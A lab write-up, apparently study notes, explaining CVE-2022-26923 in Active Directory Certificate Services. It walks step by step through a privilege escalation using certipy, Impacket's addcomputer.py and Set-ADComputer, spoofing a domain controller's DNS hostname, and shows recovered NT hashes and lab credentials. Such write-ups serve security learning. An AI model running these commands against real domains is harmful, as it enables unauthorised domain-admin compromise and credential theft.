# CVE-2022-26923 
## Micosoft Active Directory Certificate Service
Vulnerability in Microsoft's Active Directory Certificate Service that allows any AD user to escalate their privileges to Domain Admin.

Username : thm  
Password : Password1@  
Domain: lunar.eruca.com  
Machine ip : 10.10.41.103  

# CVE-2022-26923 Explained
## Client Authentication
Certificate Templates are convenient to allow users and systems to enrol for certificates. Certificates have many use case in the network.  

CVE-2022-26923 - Template misconfiguration
- Focus is on the Client Authentication use case  


Client Authentication allows the owner of the certficiate to use it to verify their own identity in AD for authentication purposes.
- Authentication occurs through Kerberos
- Valid certificate that has Client Authentication EKU > We can interface with AD CS + Key Distribution Centre to request a Kerberos TGT that can be used for further authentication

Attacker:
- Generate a TGT to impersonate another user
- Aim is to be able to modify Subject Alternative Name attribute of the certificate request to point to someone else (that has more permissions to perform privilege escalation)

TGT:
- Kerberos
- Ticket Granting Ticket serves as a user's proof of authentication
- Allows a user to request service tickets from KDC
- Used to connected services across the network

## Default Certificate Templates
When AD CS is installed in an environment, 2 certificate templates are made available for requests that support Client Authentication.

User Certificate Template
- Can be requested by any user that belongs to the Domain User group

    - User Template is not vulnerable by default
    - Request a certificate based on the User template, the User Principal Name of the user account will be embedded in the SAN that can be used for identification
    - UPNs must be unique, unable to modify UPN
    - Unable to alter the SAN value in the certificate signing request, we cannot impersonate another use by specifying their UPN  


Machine Certificate Template
- Can be requested by any host that belongs to the Domain Computer group

	- Computer accounts do not have UPN
	- Instead of using UPN for authentication > machine template uses DNS name of the machine for identification + authentication
    - When a certificate is requested for a machine through the Machine template, AD CS embeds the machine DNS name into the SAN (used for authentication)

## Default Domain User Privileges

- Any user who is a member of Authenticated User group (all AD accounts) can enrol up to 10 new machines on the domain
- Used in organizations to allow users to BYOD and enrol for use on domain
- Enrol a new host in AD > assigned as the owner of that host > permissions over the AD Object associated with that host

2 permissions cause an issue here:

Validate write to DNS hostname
- Permission allows us to update DNS hostname of AD Object associated with host

Validate write to Service Principal Name
- Permission allows us to update SPN of AD Object associated with host  

    - SPNs are used by Kerberos authentication to associate a service instance with a service logon account
    - Computer AD Object receives SPNs associated with their name to allow for Kerberos authentication
    - SPNs must be unique > 2 AD Objects are not allowed to have the same SPN

## Putting it all together
Using these configurations:
- The default AD CS machine certificate template
- The default ability to enrol a new machine
- Default permissions assigned on the creator Computer AD Object

We potentially have privilege escalation.

1. Compromise the credentials of a low-privileged AD user
2. Use those credentials to enrol a new host on domain
3. Alter DNS hostname attribute of Computer AD Object to that of a privileged host (Domain Controller)
4. Remove SPN attribute to bypass unique SPN conflict issue
5. Request a Machine certificate using default template
Perform Kerberos authentication with the received template

# Exploiting CVE-2022-26923
## Configure DNS
- Modify /etc/hosts
- Add the following entry 

<pre>10.10.41.103 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca.com</pre>

## Testing Certificate Generation
- Use certipy for exploiation
- Offensive tool for enumeration and exploiation of AD CS vulnerabilities and misconfigurations
- Integrates with Impacket

Generate a certificate for low-privileged AD user (Username=thm Password=Password1@) using the certificate template :
<pre>certipy req 'lunar.eruca.com/thm:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with UPN 'thm@lunar.eruca.com'
[*] Saved certificate and private key to 'thm.pfx'</pre>

Verify that the credentials are valid and can be used for Kerberos authentication :
<pre>certipy auth -pfx thm.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: thm@lunar.eruca.com
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'thm.ccache'
[*] Trying to retrieve NT hash for 'thm'
[*] Got NT hash for 'thm@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a</pre>

Certipy performs authentication with the certificate and uses Impacket to recover the NTLM hash associated with UPN specified in certificate.

## Add Computer to the Domain
- Add a new computer to the domain to generate Machine certificate
- Use Impacket `addcomputer.py` script to make it look like we are adding a computer  

<pre>addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'
Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account THMPC$ with password Password1@.</pre>

`lunar.eruca.com/thm:Password1@` : Need to provide valid AD credentials in order to add new computer  

`method` : Method of authentication. LDAPS will interface with LDAP service on Domain Controller

`computer-name` : Name of our computer

`computer-pass` : Password associated with computer account 

Generate a certificate for the new computer we created:
- Add $ at the end of computer name

<pre>certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 17
[*] Got certificate with DNS Host Name 'THMPC.lunar.eruca.com'
[*] Saved certificate and private key to 'thmpc.pfx'</pre>

Verify that certificate is valid using certipy :

<pre>certipy auth -pfx thmpc.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: thmpc$@lunar.eruca.com
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'thmpc.ccache'
[*] Trying to retrieve NT hash for 'thmpc$'
[*] Got NT hash for 'thmpc$@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a</pre>

Verify the NTLM hash recovered against the password set for machine:  
https://codebeautify.org/ntlm-hash-generator

## Updating the DNS Hostname and SPN attributes
- Use the SD-RSAT PowerShell cmdlets

ssh into machine : `ssh lunar.eruca.com\\thm@lundc`

Start PowerShell on machine:
<pre>lunar\thm@LUNDC C:\Users\thm> PowerShell</pre>

Get current attributes from Computer AD Object using `Get-ADComputer` :

<pre>PS C:\Users\thm> Get-ADComputer THMPC -properties dnshostname,serviceprincipalname

DistinguishedName    : CN=THMPC,CN=Computers,DC=lunar,DC=eruca,DC=com
DNSHostName          : THMPC.lunar.eruca.com
Enabled              : True
Name                 : THMPC
ObjectClass          : computer
ObjectGUID           : 81503411-1198-4c43-a6ed-0f1e3e4d0f4b
SamAccountName       : THMPC$
serviceprincipalname : {RestrictedKrbHost/THMPC.lunar.eruca.com, RestrictedKrbHost/THMPC, HOST/THMPC.lunar.eruca.com, HOST/THMPC} 
SID                  : S-1-5-21-3330634377-1326264276-632209373-11217</pre>

Both the DNS Hostname + SPN attributes match the computer's name.

Update the DNS Hostname attribute to that of DC using `Set-ADComputer` :
<pre>PS C:\Users\thm> Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com

Set-ADComputer : The operation failed because SPN value provided for addition/modification is not unique forest-wide 
At line:1 char:1                                                                                                     
+ Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com                                                           
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                           
    + CategoryInfo          : NotSpecified: (THMPC:ADComputer) [Set-ADComputer], ADException                        
    + FullyQualifiedErrorId : ActiveDirectoryServer:8647,Microsoft.ActiveDirectory.Management.Commands.SetADComputer</pre>

Microsoft automatically changes the SPN attribute when we set DNS Hostname.

Since SPN already exists for LUNDC, command fails `This operation failed...`

Remove our current SPN attribute : 
<pre>PS C:\Users\thm> Set-ADComputer THMPC -ServicePrincipalName @{}</pre>

Try and set the DNS Hostname attribute to that of Domain Controller :
<pre>PS C:\Users\thm> Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
</pre>

Command was successful!

<pre>PS C:\Users\thm> Get-ADComputer THMPC -properties dnshostname,serviceprincipalname

DistinguishedName : CN=THMPC,CN=Computers,DC=lunar,DC=eruca,DC=com
DNSHostName       : LUNDC.lunar.eruca.com
Enabled           : True
Name              : THMPC
ObjectClass       : computer
ObjectGUID        : 81503411-1198-4c43-a6ed-0f1e3e4d0f4b
SamAccountName    : THMPC$
SID               : S-1-5-21-3330634377-1326264276-632209373-11217
UserPrincipalName :
</pre>

By removing SPN, Microsoft no longer tries to change SPN when we change our DNS Hostname.

We can now change it to a host's DNS Hostname.

## Forging a Malicious Certificate
- Request certificate
- Request new certificate for our computer

<pre>certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 20
[*] Got certificate with DNS Host Name 'LUNDC.lunar.eruca.com'
[*] Saved certificate and private key to 'lundc.pfx'</pre>

- Requested certificate for THMPC
- Received certificate for LUNDC

Verify certificate + return NTLM Hash of LUNDC machine account :

<pre>certipy auth -pfx lundc.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: lundc$@lunar.eruca.com
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'lundc.ccache'
[*] Trying to retrieve NT hash for 'lundc$'
[*] Got NT hash for 'lundc$@lunar.eruca.com': 14fc9b5814def64289bb694f6659c733</pre>

- NTLM Hash of the machine account of LUNDC
- LUNDC is a Domain Controller
- We have administrative access to the Domain Controller